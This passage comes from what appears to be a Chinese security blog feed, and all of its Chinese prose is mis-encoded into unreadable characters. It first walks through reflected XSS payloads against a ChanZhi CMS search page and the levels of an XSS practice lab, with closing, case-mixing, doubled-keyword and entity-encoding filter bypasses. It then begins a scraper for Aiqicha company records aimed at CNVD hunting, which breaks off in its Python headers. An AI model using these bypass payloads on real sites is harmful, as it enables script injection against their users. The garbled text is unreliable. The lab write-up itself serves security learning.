æ‰å¯ä»¥ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-%25%37%38%25%32%37%25%33%65%25%33%63%25%36%39%25%36%64%25%36%37-1.html</span><br></pre></td></tr></table></figure><p>åˆ™å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&#x27;text&#x27; name=&#x27;words&#x27; id=&#x27;words&#x27; value=&#x27; abc&#x27; onmouseover=&#x27;alert(1) &#x27; class=&#x27;form-control&#x27; placeholder=&#x27;&#x27; /&gt;è¿›è¡Œä¸¤æ¬¡ç¼–ç </span><br><span class="line">ç»“æœæˆåŠŸ</span><br><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-%25%36%31%25%36%32%25%36%33%25%32%37%25%32%30%25%36%66%25%36%65%25%36%64%25%36%66%25%37%35%25%37%33%25%36%35%25%36%66%25%37%36%25%36%35%25%37%32%25%33%64%25%32%37%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39-1.html</span><br></pre></td></tr></table></figure><p>å°è¯•è®©é¡µé¢è¿›å…¥å°±å¼¹çª—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chanzhi7.njhack.xyz/www/index.php/search-index-%25%37%38%25%32%37%25%32%30%25%32%66%25%33%65%25%32%35%25%33%33%25%36%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%36%35%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%33%31%25%32%39%25%32%35%25%33%33%25%36%33%25%32%35%25%33%32%25%36%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%36%35%25%33%63%25%36%39%25%36%64%25%36%37%25%32%30%25%37%33%25%37%32%25%36%33%25%33%64%25%32%37-1.html</span><br></pre></td></tr></table></figure><h3 id="3-XSSé¶åœº"><a href="#3-XSSé¶åœº" class="headerlink" title="3.XSSé¶åœº"></a>3.XSSé¶åœº</h3><h4 id="1-xssåŸºç¡€"><a href="#1-xssåŸºç¡€" class="headerlink" title="1.xssåŸºç¡€"></a>1.xssåŸºç¡€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.151/xss/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-é—­åˆ"><a href="#2-é—­åˆ" class="headerlink" title="2.é—­åˆ"></a>2.é—­åˆ</h4><p>å®¡æŸ¥é¡µé¢å…ƒç´ <br>testçš„åœ°æ–¹æ˜¯æ³¨å…¥ç‚¹ï¼Œå°è¯•é—­åˆæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;test&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;test&quot;&gt;</span><br><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;</span><br><span class="line">&lt;input name=&quot;keyword&quot; value=&quot;&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="3-å•å¼•å·é—­åˆ"><a href="#3-å•å¼•å·é—­åˆ" class="headerlink" title="3.å•å¼•å·é—­åˆ"></a>3.å•å¼•å·é—­åˆ</h4><p>æŸ¥çœ‹é¡µé¢æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;&#x27;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&quot;keyword&quot; value=&#x27;&#x27;  onmouseover=alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x&#x27; onclick = alert(1) //</span><br></pre></td></tr></table></figure><h4 id="4-é—­åˆ"><a href="#4-é—­åˆ" class="headerlink" title="4.é—­åˆ"></a>4.é—­åˆ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x&quot; onclick=alert(1)//</span><br></pre></td></tr></table></figure><h4 id="5-é—­åˆ-é“¾æ¥"><a href="#5-é—­åˆ-é“¾æ¥" class="headerlink" title="5.é—­åˆ+é“¾æ¥"></a>5.é—­åˆ+é“¾æ¥</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot; </span><br></pre></td></tr></table></figure><h4 id="6-å¤§å°å†™ç»•è¿‡"><a href="#6-å¤§å°å†™ç»•è¿‡" class="headerlink" title="6.å¤§å°å†™ç»•è¿‡"></a>6.å¤§å°å†™ç»•è¿‡</h4><p>å±è”½on , src , href</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x&quot;&gt;&lt;img SrC=x Onerror=alert(1) //</span><br></pre></td></tr></table></figure><h4 id="7-åŒå†™ç»•è¿‡"><a href="#7-åŒå†™ç»•è¿‡" class="headerlink" title="7.åŒå†™ç»•è¿‡"></a>7.åŒå†™ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x&quot;&gt;&lt;img SSrcrC=x OOnnerror=alert(1) //</span><br></pre></td></tr></table></figure><h4 id="8-unicodeç¼–ç ç»•è¿‡"><a href="#8-unicodeç¼–ç ç»•è¿‡" class="headerlink" title="8.unicodeç¼–ç ç»•è¿‡"></a>8.unicodeç¼–ç ç»•è¿‡</h4><p>é‡åˆ°javascriptå’Œ onåˆ™ä¼šæ›¿æ¢_</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¯¹Cè¿›è¡Œunicodeç¼–ç </span><br><span class="line">javaS&amp;#99;ript:alert(1)</span><br><span class="line">2.å¯¹javascriptæ•´ä½“è¿›è¡Œç¼–ç </span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure><h4 id="9-åˆæ³•urlå®¡æ ¸ï¼ŒåŠ -x2F-x2F-http-x2F-x2F"><a href="#9-åˆæ³•urlå®¡æ ¸ï¼ŒåŠ -x2F-x2F-http-x2F-x2F" class="headerlink" title="9.åˆæ³•urlå®¡æ ¸ï¼ŒåŠ &#x2F;&#x2F;http:&#x2F;&#x2F;"></a>9.åˆæ³•urlå®¡æ ¸ï¼ŒåŠ &#x2F;&#x2F;http:&#x2F;&#x2F;</h4><p>æç¤ºurlä¸åˆæ³•ï¼Œéœ€è¦åœ¨è¾“å…¥çš„å†…å®¹åé¢å†™http:&#x2F;&#x2F;ä½¿å¾—å†…å®¹åˆæ³•<br>javascript:alert(1) è¿›è¡Œå®ä½“å­—ç¬¦ç¼–ç ï¼Œç„¶åxxxxx &#x2F;&#x2F;http:&#x2F;&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure><h4 id="10-getä¼ å…¥å‚æ•°ï¼Œå°è¯•é—­åˆï¼Œtype-x3D-â€â€"><a href="#10-getä¼ å…¥å‚æ•°ï¼Œå°è¯•é—­åˆï¼Œtype-x3D-â€â€" class="headerlink" title="10.getä¼ å…¥å‚æ•°ï¼Œå°è¯•é—­åˆï¼Œtype&#x3D;â€â€"></a>10.getä¼ å…¥å‚æ•°ï¼Œå°è¯•é—­åˆï¼Œtype&#x3D;â€â€</h4><p>æŸ¥çœ‹é¡µé¢æºç <br>æœªæ˜¾ç¤ºä¼ å…¥æ–¹å¼ï¼Œé»˜è®¤æ˜¯GET<br>å¯¹t_link,t_history,t_sortå¯¹å°è¯•ä¼ å…¥å‚æ•°æŸ¥çœ‹ååº”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level10&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œwell done!ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°åªæœ‰t_sortæœ‰ååº”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.151/xss/level10.php?keyword=t_link=1&amp;t_history=2&amp;t_sort=3 </span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;3&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure><p>å¿…é¡»è¦åŠ ä¸ªtype &#x3D; â€œâ€ ,æœ‰typeå°±ä¼šæœ‰æ˜¾ç¤ºå†…å®¹ï¼Œå¦åˆ™ä¼šè¢«hidden</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.10.151/xss/level10.php?keyword=aaaaa&amp;t_link=1&amp;t_history=2&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(1) //</span><br><span class="line">http://192.168.10.151/xss/level10.php?keyword=t_link=1&amp;t_history=2&amp;t_sort=3 </span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot; &quot; type=&quot; &quot; onclick=alert(1) //  &quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¬è™«å®æˆ˜-çˆ¬å–çˆ±ä¼æŸ¥ä¼ä¸šæ•°æ®</title>
      <link href="/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/"/>
      <url>/2023/07/05/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%88%AC%E5%8F%96%E7%88%B1%E4%BC%81%E6%9F%A5%E6%95%B0%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h1><p>â€‹çˆ±ä¼æŸ¥æ˜¯ç™¾åº¦æ¨å‡ºçš„ä¼ä¸šä¿¡æ¯æŸ¥è¯¢å·¥å…·ï¼Œå¯å¿«é€ŸæŸ¥è¯¢ä¼ä¸šç›¸å…³ä¿¡æ¯ã€‚åœ¨å¹³æ—¶æµ‹è¯•æ—¶ï¼Œæµ‹è¯•äººå‘˜éœ€è¦æ”¶é›†å¤§é‡çš„ä¼ä¸šä¿¡æ¯ï¼Œå¯ä»¥å€ŸåŠ©çˆ¬è™«çˆ¬å–çˆ±ä¼æŸ¥ç½‘ç«™å®ç°ã€‚</p><p>â€‹åœ¨æŒ–é€šç”¨å‹CNVDæ—¶ ï¼Œä¸€èˆ¬éœ€è¦æ»¡è¶³ä¼ä¸šæ³¨å†Œèµ„é‡‘åœ¨5000wä»¥ä¸Šï¼Œæœ¬æ–‡æ¼”ç¤ºçˆ¬å–æ»¡è¶³æ³¨å†Œèµ„é‡‘åœ¨5000wä»¥ä¸Šçš„ä¼ä¸šä¿¡æ¯ã€‚</p><h1 id="2-åˆ†ææ€è·¯"><a href="#2-åˆ†ææ€è·¯" class="headerlink" title="2.åˆ†ææ€è·¯"></a>2.åˆ†ææ€è·¯</h1><p>1.ç™»å½•çˆ±ä¼æŸ¥ï¼Œç­›é€‰ä¼ä¸šç±»å‹ä¸º</p><ul><li>æ³¨å†Œèµ„é‡‘åœ¨5000ä¸‡ä»¥ä¸Š</li><li>èµ„æœ¬ç±»å‹ä¸ºäººæ°‘å¸</li><li>ä¼ä¸šçŠ¶æ€ä¸ºå¼€ä¸š</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011543018.png"></a></p><p>2.è¿›å…¥ç½‘ç«™åå°è¯•ä»æºç ä¸­å–å‡ºå¹¿å·å¸‚è”æ¹¾åŒºåå¼ºç”µåŠ¨è®¾å¤‡è¡Œè¶Šç§€åˆ†è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544160.png" alt="image.png"></p><p>å‘ç°æŸ¥è¯¢å¤±è´¥ï¼š<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011544919.png" alt="image.png"></p><p>å°è¯•f12æŠ“åŒ…çœ‹è¯·æ±‚<br>å‘ç°åŒ…å†…å®¹è¿‡å¤šã€‚</p><p>3.é€‰æ‹©å»çˆ¬ä¼ä¸šåç§°å’Œæ³¨å†Œèµ„æœ¬</p><p>ç‚¹å‡»ä¸‹æ–¹çš„é¡µé¢ç´¢å¼•ï¼š<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011545837.png" alt="image.png"></p><p>æŸ¥çœ‹æŠ“åˆ°çš„åŒ…çš„è®¿é—®payload<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546571.png" alt="image.png"></p><p>å°è¯•å¤šè®¿é—®å‡ é¡µ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011546613.png" alt="image.png"><br>å‘ç°payloadåŸºæœ¬ä¸€è‡´<br>p:ä»£è¡¨é¡µæ•°<br>f:ä»£è¡¨ç­›é€‰çš„æ•°æ®ä¿¡æ¯</p><p>4.æŸ¥çœ‹ResponseåŒ…ï¼ˆéƒ¨åˆ†)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line">https<span class="punctuation">:</span><span class="comment">//aiqicha.baidu.com/s/advanceSearchAjax?p=2&amp;s=10&amp;f=%7B%22regCap%22:[%7B%22start%22:5000,%22end%22:0%7D],%22regCapType%22:[%221%22],%22openStatus%22:[%22%E5%BC%80%E4%B8%9A%22]%7D&amp;o=0</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;qType&quot;</span><span class="punctuation">:</span> <span class="number">111</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queryStr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;pageNum&quot;</span><span class="punctuation">:</span> <span class="number">3</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;resultList&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;pid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91770835364651&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6709\u9650\u8d23\u4efb\u516c\u53f8(\u81ea\u7136\u4eba\u6295\u8d44\u6216\u63a7\u80a1)&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;validityFrom&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018-08-22&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;domicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;entLogo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;openStatus&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;legalPerson&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;logoWord&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u4e49\u94ed\u5efa\u7b51&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hkLable&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isHkComp&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isClaim&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u4e49\u94ed\u5efa\u7b51\u52b3\u52a1\u6709\u9650\u516c\u53f8&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleLegal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5415\u7956\u5f3a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;titleDomicile&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6d59\u6c5f\u7701\u676d\u5dde\u5e02\u94b1\u5858\u65b0\u533a\u4e07\u4e9a\u540d\u57ce2\u5e62715\u5ba4&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regCap&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1,011,000,000.0\u4e07&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u8bb8\u53ef\u9879\u76ee\uff1a\u623f\u5c4b\u5efa\u7b51\u548c\u5e02\u653f\u57fa\u7840\u8bbe\u65bd\u9879\u76ee\u5de5\u7a0b\u603b\u627f\u5305\uff1b\u5404\u7c7b\u5de5\u7a0b\u5efa\u8bbe\u6d3b\u52a8\uff1b\u7535\u6c14\u5b89\u88c5\u670d\u52a1\uff1b\u5efa\u7b51\u52b3\u52a1\u5206\u5305\uff1b\u4eba\u9632\u5de5\u7a0b\u9632\u62a4\u8bbe\u5907\u5236\u9020(\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\uff0c\u7ecf\u76f8\u5173\u90e8\u95e8\u6279\u51c6\u540e\u65b9\u53ef\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8\uff0c\u5177\u4f53\u7ecf\u8425\u9879\u76ee\u4ee5\u5ba1\u6279\u7ed3\u679c\u4e3a\u51c6)\u3002\u4e00\u822c\u9879\u76ee\uff1a\u5de5\u7a0b\u7ba1\u7406\u670d\u52a1\uff1b\u4f4f\u5b85\u6c34\u7535\u5b89\u88c5\u7ef4\u62a4\u670d\u52a1\uff1b\u516c\u8def\u6c34\u8fd0\u5de5\u7a0b\u8bd5\u9a8c\u68c0\u6d4b\u670d\u52a1\uff1b\u8f68\u9053\u4ea4\u901a\u4e13\u7528\u8bbe\u5907\u3001\u5173\u952e\u7cfb\u7edf\u53ca\u90e8\u4ef6\u9500\u552e\uff1b\u627f\u63a5\u603b\u516c\u53f8\u5de5\u7a0b\u5efa\u8bbe\u4e1a\u52a1\uff1b\u571f\u77f3\u65b9\u5de5\u7a0b\u65bd\u5de5\uff1b\u56ed\u6797\u7eff\u5316\u5de5\u7a0b\u65bd\u5de5\uff1b\u57ce\u5e02\u7eff\u5316\u7ba1\u7406\uff1b\u82b1\u5349\u7eff\u690d\u79df\u501f\u4e0e\u4ee3\u7ba1\u7406\uff1b\u9632\u8150\u6750\u6599\u9500\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u96f6\u552e\uff1b\u4e94\u91d1\u4ea7\u54c1\u6279\u53d1\uff1b\u91d1\u5c5e\u6750\u6599\u9500\u552e\uff1b\u5efa\u7b51\u6750\u6599\u9500\u552e\uff1b\u6d82\u6599\u5236\u9020\uff08\u4e0d\u542b\u5371\u9669\u5316\u5b66\u54c1\uff09\uff1b\u91d1\u5c5e\u7ed3\u6784\u9500\u552e\uff1b\u5efa\u7b51\u7528\u94a2\u7b4b\u4ea7\u54c1\u9500\u552e\uff1b\u91d1\u5c5e\u7ed3\u6784\u5236\u9020(\u9664\u4f9d\u6cd5\u987b\u7ecf\u6279\u51c6\u7684\u9879\u76ee\u5916\uff0c\u51ed\u8425\u4e1a\u6267\u7167\u4f9d\u6cd5\u81ea\u4e3b\u5f00\u5c55\u7ecf\u8425\u6d3b\u52a8)\u3002&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91320322MA1X36PF3D&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;appJumpUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aiqicha:\/\/open.app?params=&#123;\&quot;naModule\&quot;:\&quot;\/aqc\/detail\&quot;,\&quot;naParam\&quot;:\&quot;&#123;\\\&quot;pid\\\&quot;:\\\&quot;91770835364651\\\&quot;&#125;\&quot;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;opening&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personTitle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6cd5\u5b9a\u4ee3\u8868\u4eba&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0fa179597fa8aaccf6f6ae44062f8a24&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;newLabels&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;opening&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>é€‰å–éƒ¨åˆ†å­—æ®µå¦‚<br>â€œentNameâ€: â€œ\u946b\u6e90\u9e3f\u660a(\u5929\u6d25)\u79d1\u6280\u6709\u9650\u516c\u53f8â€,<br>â€œregCapâ€: â€œ1,011,000,000.0\u4e07â€,</p><p>è¿›è¡Œè§£å¯†:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011547330.png" alt="image.png"></p><p>å‘ç°è§£å¯†ç»“æœå¯¹åº”äº†é¡µé¢æ‰€è¦æŠ“å–çš„ä¿¡æ¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011548084.png" alt="image.png"></p><h1 id="3-ç¨‹åºç¼–å†™"><a href="#3-ç¨‹åºç¼–å†™" class="headerlink" title="3.ç¨‹åºç¼–å†™"></a>3.ç¨‹åºç¼–å†™</h1><p>1.ä¿å­˜è®¿é—®è¯·æ±‚å¤´:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept:</span><br><span class="line">application/json, text/plain, */*</span><br><span class="line">Accept-Encoding:</span><br><span class="line">gzip, deflate, br</span><br><span class="line">Accept-Language:</span><br><span class="line">zh-CN,zh;q=0.9</span><br><span class="line">Connection:</span><br><span class="line">keep-alive</span><br><span class="line">Cookie: â€œæŠ“åˆ°çš„cookieâ€</span><br><span class="line">Host:</span><br><span class="line">aiqicha.baidu.com</span><br><span class="line">Referer:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br><span class="line">Sec-Ch-Ua:</span><br><span class="line">&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile:</span><br><span class="line">?0</span><br><span class="line">Sec-Ch-Ua-Platform:</span><br><span class="line">&quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest:</span><br><span class="line">empty</span><br><span class="line">Sec-Fetch-Mode:</span><br><span class="line">cors</span><br><span class="line">Sec-Fetch-Site:</span><br><span class="line">same-origin</span><br><span class="line">User-Agent:</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With:</span><br><span class="line">XMLHttpRequest</span><br><span class="line">Ymg_ssr:</span><br><span class="line">1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre</span><br><span class="line">Zx-Open-Url:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br></pre></td></tr></table></figure><p>çˆ¬å–ä»£ç å‰æ ¹æ®è¯·æ±‚å¤´åˆ¶ä½œheaders</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span 